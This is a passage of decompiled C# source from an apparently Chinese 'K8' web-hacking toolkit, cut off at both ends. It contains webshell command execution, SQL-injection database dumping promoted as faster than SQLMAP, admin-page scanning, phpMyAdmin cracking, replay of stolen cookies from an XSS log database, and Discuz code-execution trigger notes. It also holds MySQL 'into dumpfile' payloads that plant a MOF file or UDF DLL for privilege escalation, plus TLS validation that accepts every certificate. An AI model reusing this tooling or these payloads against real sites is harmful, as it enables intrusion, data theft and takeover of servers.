                return DALGetDataSet(command, MDBpath);
            }
        }

        public static DataSet BllGetDataSetXSS(string MDBpath, string SqlStr)
        {
            using (OleDbCommand command = new OleDbCommand(SqlStr))
            {
                return DALGetDataSet(command, MDBpath);
            }
        }

        private void btn_AddExp_Click(object sender, EventArgs e)
        {
            if (this.rb_none.Checked)
            {
                this.K8msgbox("NONE方式不能生成EXP,请选择你调式成功的提交方式(GET或POST)!");
            }
            else
            {
                string str = this.txt_addURL.Text.Trim();
                string str2 = "POST";
                if (this.rb_PostMethod.Checked)
                {
                    str2 = "POST";
                }
                else if (this.rb_GetMethod.Checked)
                {
                    str2 = "GET";
                }
                string str3 = "65001";
                string str4 = "";
                if (this.chk_submitCookies.Checked)
                {
                    str4 = this.txt_submitCookies.Text.Trim();
                }
                string str5 = this.txt_RefererURL.Text.Trim();
                string str6 = this.txt_UserAgent.Text.Trim();
                string str7 = this.txt_SubmitData.Text.Trim();
                string str8 = "false";
                if (this.chk_allowRedirect.Checked)
                {
                    str8 = "true";
                }
                else
                {
                    str8 = "false";
                }
                str = K8crack.K8expBase64(str, 1);
                str4 = K8crack.K8expBase64(str4, 1);
                str7 = K8crack.K8expBase64(str7, 1);
                str5 = K8crack.K8expBase64(str5, 1);
                str6 = K8crack.K8expBase64(str6, 1);
                string[] modelArray = new string[] { this.k8appName, this.k8btnName, this.k8btnTip, str2, str4, str7, str5, str6, str3, str8, "2014-7-11", str };
                new frmAddExploit(this, modelArray, this.k8updateID).ShowDialog();
            }
        }

        private void btn_Ascii_Sum_Click(object sender, EventArgs e)
        {
        }

        private void btn_Ascii2String_Click(object sender, EventArgs e)
        {
        }

        private void btn_AsciiEncode_Click(object sender, EventArgs e)
        {
        }

        private void btn_aspOne_Click(object sender, EventArgs e)
        {
            this.txt_WebCmdResult.Text = this.txt_aspOne.Text;
            this.txt_WebCmdResult.Enabled = true;
        }

        private void btn_aspxOne_Click(object sender, EventArgs e)
        {
            this.txt_WebCmdResult.Text = this.txt_aspxOne.Text;
            this.txt_WebCmdResult.Enabled = true;
        }

        private void btn_BackSlash2ForwardSlash_Click(object sender, EventArgs e)
        {
        }

        private void btn_Base64Decode_Click(object sender, EventArgs e)
        {
        }

        private void btn_Base64Encode_Click(object sender, EventArgs e)
        {
        }

        private void btn_base64enUTF8_Click(object sender, EventArgs e)
        {
        }

        private void btn_bin2hex_Click(object sender, EventArgs e)
        {
            Thread thread = new Thread(() => this.K8readFile2Hex("ALL Files|*.*", "", ""));
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }

        private void btn_CHARdecode_Click(object sender, EventArgs e)
        {
        }

        private void btn_Chinese2Unicode_Click(object sender, EventArgs e)
        {
        }

        private void btn_ClearData_Click(object sender, EventArgs e)
        {
            this.txt_SubmitData.Clear();
        }

        private void btn_ClearResult_Click(object sender, EventArgs e)
        {
            this.txt_Result.Clear();
        }

        private void btn_ClearScanAdmin_Click(object sender, EventArgs e)
        {
            this.LV_ScanAdmin.Clear();
            this.ScanAdminListViewsSet();
        }

        private void btn_ClearUrl_Click(object sender, EventArgs e)
        {
            this.txt_k8url.Clear();
            this.txt_k8url.Paste();
            this.Btn_Submit.Enabled = true;
        }

        private void btn_ClsCmdResult_Click(object sender, EventArgs e)
        {
            this.txt_WebCmdResult.Clear();
        }

        private void btn_ClsCookie_Click(object sender, EventArgs e)
        {
            this.txt_submitCookies.Clear();
        }

        private void btn_connectOneShell_Click(object sender, EventArgs e)
        {
            Thread thread = new Thread(new ThreadStart(this.K8_WebCMD));
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }

        private void btn_DataOutput_Click(object sender, EventArgs e)
        {
            new Thread(new ThreadStart(this.K8DataOutOne)).Start();
        }

        private void btn_dataOutputMul_Click(object sender, EventArgs e)
        {
            this.K8MoreThreadDataOutput();
        }

        private void btn_DiyloginUrlCrack_Click(object sender, EventArgs e)
        {
            new frmDiyLoginCrack().Show();
        }

        private void btn_ExecuteWebCMD_Click(object sender, EventArgs e)
        {
            this.K8_BtnExecuteCmd(this.cbb_WebCommond.Text.Trim());
        }

        private void btn_ExpUrlClearParse_Click(object sender, EventArgs e)
        {
            this.txt_ExpURL.Clear();
            this.txt_ExpURL.Paste();
        }

        private void btn_file2Ascii_Click(object sender, EventArgs e)
        {
            Thread thread = new Thread(() => this.K8readFile2chr("ALL Files|*.*", "", ""));
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }

        private void btn_ForwardSlash2BackSlash_Click(object sender, EventArgs e)
        {
        }

        private void btn_ForwardSlash2twoBackSlash_Click(object sender, EventArgs e)
        {
        }

        private void btn_Hex2String_Click(object sender, EventArgs e)
        {
        }

        private void btn_jspOne_Click(object sender, EventArgs e)
        {
            this.txt_WebCmdResult.Text = this.txt_jspOne.Text;
            this.txt_WebCmdResult.Enabled = true;
        }

        private void btn_MD5_Encode_16_Click(object sender, EventArgs e)
        {
        }

        private void btn_MD5_Encode_32_Click(object sender, EventArgs e)
        {
        }

        private void btn_mof2chr_Click(object sender, EventArgs e)
        {
            string k8startStr = "Select CHAR(";
            string k8endStr = ") into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof';";
            Thread thread = new Thread(() => this.K8readFile2chr("MOF File|*.mof", k8startStr, k8endStr));
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }

        private void btn_mof2hex_Click(object sender, EventArgs e)
        {
            string k8startStr = "select CHAR(";
            string k8endStr = ") into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof';";
            Thread thread = new Thread(() => this.K8readFile2Hex("MOF File|*.mof", k8startStr, k8endStr));
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }

        private void btn_MoreThreadScanAdmin_Click(object sender, EventArgs e)
        {
            this.K8MoreThreadScanAdmin();
        }

        private void btn_MouseHover(object sender, EventArgs e)
        {
            Button button = sender as Button;
            button.FlatAppearance.BorderSize = 1;
        }

        private void btn_MouseLeave(object sender, EventArgs e)
        {
            Button button = sender as Button;
            button.FlatAppearance.BorderSize = 0;
        }

        private void btn_MSSQL_CHR_Click(object sender, EventArgs e)
        {
        }

        private void btn_MySQL_Chr_Click(object sender, EventArgs e)
        {
        }

        private void btn_MySQL_Chr2_Click(object sender, EventArgs e)
        {
        }

        private void btn_navigateURL_Click(object sender, EventArgs e)
        {
            this.web_cookie.Navigate(this.txt_cookiesURL.Text.Trim());
        }

        private void btn_OpenXssDB_Click(object sender, EventArgs e)
        {
            OpenFileDialog dialog = new OpenFileDialog {
                Filter = "mdb file|*.mdb"
            };
            if (dialog.ShowDialog() == DialogResult.OK)
            {
                string fileName = dialog.FileName;
                string sqlStr = "select count(0) from tb_detectInfo;";
                string str3 = "select count(cookie) from tb_detectInfo where cookie<>'VisitCount'";
                string str4 = "select count(0) from(select distinct userIP from tb_detectInfo) as a";
                string str5 = this.K8getXssDBcount(fileName, sqlStr);
                string str6 = this.K8getXssDBcount(fileName, str3);
                string aLLCount = this.K8getXssDBcount(fileName, str4);
                string str8 = "select count(0) from tb_detectInfo where browser=";
                string str9 = "select count(0) from(select distinct userIP from tb_detectInfo where browser=";
                string str11 = this.K8getXssDBcount(fileName, str8 + "'MSIE 6.0'");
                string str12 = this.K8getXssDBcount(fileName, str8 + "'MSIE 7.0'");
                string str13 = this.K8getXssDBcount(fileName, str8 + "'MSIE 8.0'");
                string str14 = this.K8getXssDBcount(fileName, str8 + "'MSIE 9.0'");
                string str15 = this.K8getXssDBcount(fileName, str8 + "'MSIE 10.0'");
                string str16 = this.K8getXssDBcount(fileName, str8 + "'MSIE 11.0'");
                string minCount = this.K8getXssDBcount(fileName, str9 + "'MSIE 6.0') as a");
                string str18 = this.K8getXssDBcount(fileName, str9 + "'MSIE 7.0') as a");
                string str19 = this.K8getXssDBcount(fileName, str9 + "'MSIE 8.0') as a");
                string str20 = this.K8getXssDBcount(fileName, str9 + "'MSIE 9.0') as a");
                string str21 = this.K8getXssDBcount(fileName, str9 + "'MSIE 10.0') as a");
                string str22 = this.K8getXssDBcount(fileName, str9 + "'MSIE 11.0') as a");
                string str23 = k8calcPercent(aLLCount, minCount);
                string str24 = k8calcPercent(aLLCount, str18);
                string str25 = k8calcPercent(aLLCount, str19);
                string str26 = k8calcPercent(aLLCount, str20);
                string str27 = k8calcPercent(aLLCount, str21);
                string str28 = k8calcPercent(aLLCount, str22);
                string str29 = this.K8getXssDBcount(fileName, str8 + "'Firefox'");
                string str30 = this.K8getXssDBcount(fileName, str8 + "'Chrome'");
                string str31 = this.K8getXssDBcount(fileName, str8 + "'Safari'");
                string str32 = this.K8getXssDBcount(fileName, str8 + "'Opera'");
                string str33 = this.K8getXssDBcount(fileName, str8 + "'UCWEB'");
                string str34 = this.K8getXssDBcount(fileName, str8 + "'Netscape'");
                string str35 = this.K8getXssDBcount(fileName, str9 + "'Firefox') as a");
                string str36 = this.K8getXssDBcount(fileName, str9 + "'Chrome') as a");
                string str37 = this.K8getXssDBcount(fileName, str9 + "'Safari') as a");
                string str38 = this.K8getXssDBcount(fileName, str9 + "'Opera') as a");
                string str39 = this.K8getXssDBcount(fileName, str9 + "'UCWEB') as a");
                string str40 = this.K8getXssDBcount(fileName, str9 + "'Netscape') as a");
                string str41 = k8calcPercent(aLLCount, str35);
                string str42 = k8calcPercent(aLLCount, str36);
                string str43 = k8calcPercent(aLLCount, str37);
                string str44 = k8calcPercent(aLLCount, str38);
                string str45 = k8calcPercent(aLLCount, str39);
                string str46 = k8calcPercent(aLLCount, str40);
                this.lbl_XssInfo.Text = "总记录: " + str5;
                this.lbl_XssCookieCount.Text = "Cookie: " + str6;
                this.lbl_XssIPcount.Text = "IP统计: " + aLLCount;
                this.lbl_IE6count.Text = " IE6: 访问 " + str11 + " IP统计 " + minCount + " 百分比 " + str23;
                this.lbl_IE7count.Text = " IE7: 访问 " + str12 + " IP统计 " + str18 + " 百分比 " + str24;
                this.lbl_IE8count.Text = " IE8: 访问 " + str13 + " IP统计 " + str19 + " 百分比 " + str25;
                this.lbl_IE9count.Text = " IE9: 访问 " + str14 + " IP统计 " + str20 + " 百分比 " + str26;
                this.lbl_IE10count.Text = "IE10: 访问 " + str15 + " IP统计 " + str21 + " 百分比 " + str27;
                this.lbl_IE11count.Text = "IE11: 访问 " + str16 + " IP统计 " + str22 + " 百分比 " + str28;
                this.lbl_FirefoxCount.Text = " Firefox: 访问 " + str29 + " IP统计 " + str35 + " 百分比 " + str41;
                this.lbl_ChromeCount.Text = "  Chrome: 访问 " + str30 + " IP统计 " + str36 + " 百分比 " + str42;
                this.lbl_SafariCount.Text = "  Safari: 访问 " + str31 + " IP统计 " + str37 + " 百分比 " + str43;
                this.lbl_OperaCount.Text = "   Opera: 访问 " + str32 + " IP统计 " + str38 + " 百分比 " + str44;
                this.lbl_UCWEBCount.Text = "   UCWEB: 访问 " + str33 + " IP统计 " + str39 + " 百分比 " + str45;
                this.lbl_NetscapeCount.Text = "Netscape: 访问 " + str34 + " IP统计 " + str40 + " 百分比 " + str46;
            }
        }

        private void btn_Oracle_ChrCode_Click(object sender, EventArgs e)
        {
        }

        private void btn_OutDataStop_Click(object sender, EventArgs e)
        {
            this.K8AbortScan = true;
            this.btn_OutDataStop.Enabled = false;
            this.btn_DataOutput.Enabled = true;
            this.btn_dataOutputMul.Enabled = true;
            GC.Collect();
            this.txt_resultDataOut.AppendText("停止脱库! \r\n\r\n");
        }

        private void btn_phpOne_Click(object sender, EventArgs e)
        {
            this.txt_WebCmdResult.Text = this.txt_phpOne.Text;
            this.txt_WebCmdResult.Enabled = true;
        }

        private void btn_setCookies_Click(object sender, EventArgs e)
        {
            string text = this.txt_cookiesURL.Text;
            if (text == "")
            {
                this.K8msgbox("请先输入目标网址!");
            }
            else
            {
                if (!text.Contains("http://") & !text.Contains("https://"))
                {
                    text = "http://" + text;
                }
                string[] strArray = this.txt_getCookies.Text.Trim().Split(";".ToCharArray());
                foreach (string str3 in strArray)
                {
                    if (str3.Trim() != "")
                    {
                        string lbszCookieName = str3.Substring(0, str3.IndexOf("="));
                        InternetSetCookie(text, lbszCookieName, str3.Substring(str3.IndexOf("=") + 1, (str3.Length - str3.IndexOf("=")) - 1) + ";Expires=Sun,22-Feb-1987 00:00:00 GMT");
                    }
                }
                this.K8msgbox("k8team");
                this.web_cookie.Navigate(text);
                this.web_cookie.Navigate(text);
            }
        }

        private void btn_setHttponlyCookie_Click(object sender, EventArgs e)
        {
            string lpszUrlName = this.txt_cookiesURL.Text.Trim();
            if (lpszUrlName == "")
            {
                this.K8msgbox("请先输入目标网址!");
            }
            else
            {
                string str2 = this.txt_getCookies.Text.Trim();
                string[] strArray = this.txt_getHttponlyCookie.Text.Trim().Split(";".ToCharArray());
                foreach (string str4 in strArray)
                {
                    if (str4.Trim() != "")
                    {
                        string lbszCookieName = str4.Substring(0, str4.IndexOf("="));
                        InternetSetCookie(lpszUrlName, lbszCookieName, str4.Substring(str4.IndexOf("=") + 1, (str4.Length - str4.IndexOf("=")) - 1) + ";Expires=Sat, 18 Jul 2020 08:17:08 GMT");
                    }
                }
                Thread.Sleep(0x3e8);
                this.web_cookie.Navigate(lpszUrlName);
            }
        }

        private void btn_Sha1_Click(object sender, EventArgs e)
        {
        }

        private void btn_SHA256_encode_Click(object sender, EventArgs e)
        {
        }

        private void btn_SHA384_encode_Click(object sender, EventArgs e)
        {
        }

        private void btn_SHA512_encode_Click(object sender, EventArgs e)
        {
        }

        private void btn_SingleScanAdmin_Click(object sender, EventArgs e)
        {
            this.K8singleScanAdmin();
        }

        private void btn_StopScanAdmin_Click(object sender, EventArgs e)
        {
            this.K8isAbortScanAdmin = true;
            GC.Collect();
        }

        private void btn_Str2Hex_Click(object sender, EventArgs e)
        {
        }

        private void btn_strBackSlashTwoQuote2Twoquote_Click(object sender, EventArgs e)
        {
        }

        private void btn_STRcolon2colonEqual_Click(object sender, EventArgs e)
        {
        }

        private void btn_STRcolonEqual2colon_Click(object sender, EventArgs e)
        {
        }

        private void btn_STRspace2Per20_Click(object sender, EventArgs e)
        {
        }

        private void btn_STRspace2rem_Click(object sender, EventArgs e)
        {
        }

        private void btn_strTwoquote2BackSlashTwoQuote_Click(object sender, EventArgs e)
        {
        }

        private void Btn_Submit_Click(object sender, EventArgs e)
        {
            Thread thread = new Thread(new ThreadStart(this.k8submit));
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }

        private void btn_twoBackSlash2ForwardSlash_Click(object sender, EventArgs e)
        {
        }

        private void btn_udf2chr_Click(object sender, EventArgs e)
        {
            string k8startStr = "select CHAR(";
            string k8endStr = @") into dumpfile 'c:\\windows\\udf.dll';";
            Thread thread = new Thread(() => this.K8readFile2chr("UDF DLL|*.dll", k8startStr, k8endStr));
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }

        private void btn_udf2hex_Click(object sender, EventArgs e)
        {
            string k8startStr = "Select Unhex('";
            string k8endStr = @"') into dumpfile 'c:\\windows\\udf.dll';";
            Thread thread = new Thread(() => this.K8readFile2Hex("UDF DLL|*.dll", k8startStr, k8endStr));
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }

        private void btn_Unicode2Chinese_Click(object sender, EventArgs e)
        {
        }

        private void btn_UpdateCookies_Click(object sender, EventArgs e)
        {
            string lpszUrlName = this.txt_cookiesURL.Text.Trim();
            if (lpszUrlName == "")
            {
                this.K8msgbox("请先输入目标网址!");
            }
            else
            {
                string str2 = this.txt_getCookies.Text.Trim();
                string str3 = this.txt_getHttponlyCookie.Text.Trim();
                string[] strArray = str2.Split(";".ToCharArray());
                foreach (string str4 in strArray)
                {
                    if (str4.Trim() != "")
                    {
                        string lbszCookieName = str4.Substring(0, str4.IndexOf("="));
                        InternetSetCookie(lpszUrlName, lbszCookieName, str4.Substring(str4.IndexOf("=") + 1, (str4.Length - str4.IndexOf("=")) - 1) + ";Expires=Sat, 18 Jul 2020 08:17:08 GMT");
                    }
                }
                Thread.Sleep(0x3e8);
                this.web_cookie.Navigate(lpszUrlName);
            }
        }

        private void btn_Url_Decode2_Click(object sender, EventArgs e)
        {
        }

        private void btn_Url_DecodeGB2312_Click(object sender, EventArgs e)
        {
        }

        private void btn_Url_DecodeUnicode_Click(object sender, EventArgs e)
        {
        }

        private void btn_Url_DecodeUTF8_Click(object sender, EventArgs e)
        {
        }

        private void btn_Url_Encode_Click(object sender, EventArgs e)
        {
        }

        private void btn_Url_Encode2_Click(object sender, EventArgs e)
        {
        }

        private void btn_Url_EncodeGB2312_Click(object sender, EventArgs e)
        {
        }

        private void btn_Url_EncodeUnicode_Click(object sender, EventArgs e)
        {
        }

        private void btn_Url_EncodeUTF8_Click(object sender, EventArgs e)
        {
        }

        private void btn_Url_Path_16_Click(object sender, EventArgs e)
        {
        }

        private void btn_WebExploitNivigate_Click(object sender, EventArgs e)
        {
            this.web_exploit.Navigate(this.txt_ExpURL.Text.Trim() + "/robots.txt");
        }

        private void btn_XSS_JSescape_ALL_Click(object sender, EventArgs e)
        {
        }

        private void btn_XSS_JSescape_Click(object sender, EventArgs e)
        {
        }

        private void btn_xss_JSstringHex_Click(object sender, EventArgs e)
        {
        }

        private void btn_xss_JSunicode_Click(object sender, EventArgs e)
        {
        }

        private void btn_xssfromCharCode_Click(object sender, EventArgs e)
        {
        }

        private void btn_xssHTMLCharacter10_Click(object sender, EventArgs e)
        {
        }

        private void btn_xssHTMLCharacter16_Click(object sender, EventArgs e)
        {
        }

        private void btn_xsshtmlUTF8_Click(object sender, EventArgs e)
        {
            MessageBox.Show("未完成...");
        }

        private void button1_Click(object sender, EventArgs e)
        {
            this.txt_getCookies.Text = CookieReader.GetCookie("http://www.baidu.com");
        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            new frmphpMyAdminCrack().Show();
        }

        private void button10_Click(object sender, EventArgs e)
        {
            K8useIExporer("http://www.md5.asia/");
        }

        private void button11_Click(object sender, EventArgs e)
        {
        }

        private void button2_Click_1(object sender, EventArgs e)
        {
            this.K8createTabExpBtn();
        }

        private void button4_Click(object sender, EventArgs e)
        {
        }

        private void button4_Click_1(object sender, EventArgs e)
        {
            this.K8msgbox("使用说明: 只要你把SQL语句里的ID=$var$ 就可脱\r\n没有SQLMAP那么麻烦 那么慢 也不会像Burp搞得卡死\r\nVPN超时2800多毫秒 都能正常脱库 不卡不搞死目标站\r\n\r\n上面说的是单线程,多线程的速度也非常快\r\n当然和Burp一样多线程有可能搞死目标站,\r\n但比Burp多几个优点： 1 脱库可以实时保存.\r\n2 自动保存脱库配置,网络意外中断,可接着脱");
        }

        private void button8_Click(object sender, EventArgs e)
        {
            K8useIExporer("www.cmd5.com");
        }

        private void button9_Click(object sender, EventArgs e)
        {
            K8useIExporer("http://www.hashkiller.co.uk/md5-decrypter.aspx");
        }

        private void cbb_expDebugCoding_SelectedIndexChanged(object sender, EventArgs e)
        {
        }

        private void cbb_expDebugCoding_TextChanged(object sender, EventArgs e)
        {
            if (this.web_expDebugResult.Document != null)
            {
                this.web_expDebugResult.Document.Encoding = this.K8webBrowserEncoding(this.cbb_expDebugCoding.Text.Trim().ToUpper());
                this.web_expDebugResult.Refresh();
            }
        }

        private void Cbb_UserAgent_SelectedIndexChanged(object sender, EventArgs e)
        {
            this.txt_UserAgent.Text = this.k8userAgentDB();
        }

        private string ChangeStrToDBC(string str)
        {
            char[] chars = str.ToCharArray();
            for (int i = 0; i < chars.Length; i++)
            {
                byte[] bytes = Encoding.Unicode.GetBytes(chars, i, 1);
                if ((bytes.Length == 2) && (bytes[1] == 0xff))
                {
                    bytes[0] = (byte) (bytes[0] + 0x20);
                    bytes[1] = 0;
                    chars[i] = Encoding.Unicode.GetChars(bytes)[0];
                }
            }
            return new string(chars);
        }

        private string ChangeStrToSBC(string str)
        {
            char[] chars = str.ToCharArray();
            for (int i = 0; i < chars.Length; i++)
            {
                byte[] bytes = Encoding.Unicode.GetBytes(chars, i, 1);
                if ((bytes.Length == 2) && (bytes[1] == 0))
                {
                    bytes[0] = (byte) (bytes[0] - 0x20);
                    bytes[1] = 0xff;
                    chars[i] = Encoding.Unicode.GetChars(bytes)[0];
                }
            }
            return new string(chars);
        }

        public bool CheckValidationResult(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors errors)
        {
            return true;
        }

        private void chk_Cookies_CheckedChanged(object sender, EventArgs e)
        {
        }

        private void chk_DataOutputSetting_CheckedChanged(object sender, EventArgs e)
        {
            if (this.chk_DataOutputSetting.Checked)
            {
                this.gb_dataOutput.Height = 15;
                this.txt_resultDataOut.Top = 20;
                this.txt_resultDataOut.Height = 650;
            }
            else
            {
                this.gb_dataOutput.Height = 0x85;
                this.txt_resultDataOut.Top = 0x8a;
                this.txt_resultDataOut.Height = 0x215;
            }
        }

        private void chk_DataOutRegex_CheckedChanged(object sender, EventArgs e)
        {
            if (this.chk_DataOutRegex.Checked)
            {
                this.lbl_dataOutRexex.Visible = true;
                this.txt_dataOutRegex.Visible = true;
                this.lbl_dataOutEndStr.Visible = false;
                this.lbl_dataOutStrStart.Visible = false;
                this.txt_dataOutEndStr.Visible = false;
                this.txt_dataOutstartStr.Visible = false;
            }
            else
            {
                this.lbl_dataOutRexex.Visible = false;
                this.txt_dataOutRegex.Visible = false;
                this.lbl_dataOutEndStr.Visible = true;
                this.lbl_dataOutStrStart.Visible = true;
                this.txt_dataOutEndStr.Visible = true;
                this.txt_dataOutstartStr.Visible = true;
            }
        }

        private void chk_GetMethod_CheckedChanged(object sender, EventArgs e)
        {
            if (this.rb_GetMethod.Checked)
            {
                this.rb_PostMethod.Checked = false;
                this.Btn_Submit.Enabled = true;
            }
        }

        private void chk_PostMethod_CheckedChanged(object sender, EventArgs e)
        {
            if (this.rb_PostMethod.Checked)
            {
                this.rb_GetMethod.Checked = false;
                this.Btn_Submit.Enabled = true;
            }
        }

        private void chk_Result_WebBrowser_CheckedChanged_1(object sender, EventArgs e)
        {
            if (this.chk_Result_WebBrowser.Checked)
            {
                this.chk_ResultText.Checked = false;
                this.txt_Result.Visible = false;
                this.web_expDebugResult.Visible = true;
                this.web_expDebugResult.ScriptErrorsSuppressed = true;
                this.web_expDebugResult.DocumentText = this.txt_Result.Text;
            }
        }

        private void chk_ResultText_CheckedChanged(object sender, EventArgs e)
        {
            if (this.chk_ResultText.Checked)
            {
                this.chk_Result_WebBrowser.Checked = false;
                this.txt_Result.Visible = true;
                this.web_expDebugResult.Visible = false;
                this.txt_Result.Text = this.web_expDebugResult.DocumentText;
            }
        }

        private void chk_VisbleOnePwd_CheckedChanged(object sender, EventArgs e)
        {
            if (this.chk_VisbleOnePwd.Checked)
            {
                this.txt_OneShellPwd.UseSystemPasswordChar = false;
            }
            else
            {
                this.txt_OneShellPwd.UseSystemPasswordChar = true;
            }
        }

        private void Close_MouseDown(object sender, MouseEventArgs e)
        {
            Panel panel = (Panel) sender;
            if (panel.Name == "K8skinClose_Move")
            {
                (base.Controls.Find("K8skinClose_Down", true)[0] as Panel).BringToFront();
                (base.Controls.Find("K8skinClose_Down", true)[0] as Panel).Visible = true;
            }
        }

        private void Close_MouseLeave(object sender, EventArgs e)
        {
            Panel panel = (Panel) sender;
            if (panel.Name == "K8skinClose_Move")
            {
                (base.Controls.Find("K8skinClose_Normal", true)[0] as Panel).BringToFront();
                (base.Controls.Find("K8skinClose_Move", true)[0] as Panel).Visible = false;
            }
        }

        private void Close_MouseMove(object sender, MouseEventArgs e)
        {
            Panel panel = (Panel) sender;
            if (panel.Name == "K8skinClose_Normal")
            {
                (base.Controls.Find("K8skinClose_Move", true)[0] as Panel).BringToFront();
                (base.Controls.Find("K8skinClose_Move", true)[0] as Panel).Visible = true;
            }
        }

        private void Close_MouseUp(object sender, MouseEventArgs e)
        {
            Panel panel = (Panel) sender;
            if (panel.Name == "K8skinClose_Move")
            {
                base.Close();
            }
        }

        private void cmdShellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.icoBtn_CmdShell_Click(null, null);
        }

        private void cookieBrowseToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.icoBtn_CookieBrowser_Click(null, null);
        }

        private void cookie浏览器ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.lv_webShell.SelectedItems.Count > 0)
            {
                string str = Convert.ToString(this.lv_webShell.Items[this.lv_webShell.SelectedIndices[0]].SubItems[7].Text);
                string str2 = Convert.ToString(this.lv_webShell.Items[this.lv_webShell.SelectedIndices[0]].SubItems[10].Text);
                this.txt_cookiesURL.Text = str;
                this.txt_getCookies.Text = str2;
                this.tab_MainForm.SelectedTab = this.tab_MainForm.TabPages["tab_CookieBrowser"];
            }
        }

        private void c转成StringBuilder代码rnToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                string str = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                TextBox box = new TextBox {
                    Text = str
                };
                string data = "StringBuilder k8note = new StringBuilder();\r\n";
                foreach (string str3 in box.Lines)
                {
                    data = data + "k8note.Append(\"" + str3 + "\\r\\n\");\r\n";
                }
                Clipboard.SetDataObject(data);
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void c转成StringBuilder代码正常ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                string str = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                TextBox box = new TextBox {
                    Text = str
                };
                string data = "StringBuilder k8note = new StringBuilder();\r\n";
                foreach (string str3 in box.Lines)
                {
                    data = data + "k8note.Append(\"" + str3 + "\");\r\n";
                }
                Clipboard.SetDataObject(data);
                this.txt_EncodeDecodeText.Paste();
            }
        }

        public static DataSet DALGetDataSet(OleDbCommand cmd, string MDBpath)
        {
            DataSet set2;
            string str = string.Concat(new object[] { "密", '\r', '\t', '\n', "码", '\x0002' });
            OleDbConnection connection = new OleDbConnection("Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" + MDBpath + ";Mode=Share Deny Read|Share Deny Write;Persist Security Info=False;Jet OLEDB:Database Password=\"" + str + "\"");
            cmd.Connection = connection;
            using (OleDbDataAdapter adapter = new OleDbDataAdapter())
            {
                adapter.SelectCommand = cmd;
                using (DataSet set = new DataSet())
                {
                    set.Clear();
                    try
                    {
                        adapter.Fill(set);
                    }
                    catch (Exception)
                    {
                    }
                    set2 = set;
                }
            }
            return set2;
        }

        public static DataSet DALGetDataSetXSS(OleDbCommand cmd, string MDBpath)
        {
            DataSet set2;
            string str = string.Concat(new object[] { "密", '\r', '\t', '\n', "码", '\x0002' });
            OleDbConnection connection = new OleDbConnection("Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" + MDBpath + ";Mode=Share Deny Read|Share Deny Write;Persist Security Info=False;Jet OLEDB:Database Password=\"" + str + "\"");
            cmd.Connection = connection;
            using (OleDbDataAdapter adapter = new OleDbDataAdapter())
            {
                adapter.SelectCommand = cmd;
                using (DataSet set = new DataSet())
                {
                    set.Clear();
                    try
                    {
                        adapter.Fill(set);
                    }
                    catch (Exception)
                    {
                    }
                    set2 = set;
                }
            }
            return set2;
        }

        private void dataOutputToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.icoBtn_dataOutput_Click(null, null);
        }

        private void DisAllowScanAdminControl()
        {
            this.btn_StopScanAdmin.Enabled = true;
            this.btn_SingleScanAdmin.Enabled = false;
            this.btn_MoreThreadScanAdmin.Enabled = false;
            this.rb_4P.Enabled = false;
            this.rb_ALL.Enabled = false;
            this.rb_ASP.Enabled = false;
            this.rb_ASPX.Enabled = false;
            this.rb_backup.Enabled = false;
            this.rb_CGI.Enabled = false;
            this.rb_DataBase.Enabled = false;
            this.rb_dir.Enabled = false;
            this.rb_JSP.Enabled = false;
            this.rb_PHP.Enabled = false;
            this.rb_Shell.Enabled = false;
            this.rb_UPfile.Enabled = false;
        }

        private void discuz6x7x代码执行漏洞ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Copy();
                string str = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                StringBuilder builder = new StringBuilder();
                builder.Append("Discuz 6.x/7.x 代码执行漏洞触发条件:\r\n");
                builder.Append("1 URL连接中的帖子或评论必须带有表情(没有自己去回复)\r\n");
                builder.Append("2 php>5.3.x 且 request_order值为GP (默认值为GP)\r\n");
                builder.Append("3 后台--帖子内容页---最大单一表情解析次数: 为0\r\n");
                builder.Append("4 第2次提交Cookie,若没成功,请在浏览框里右键刷新\r\n");
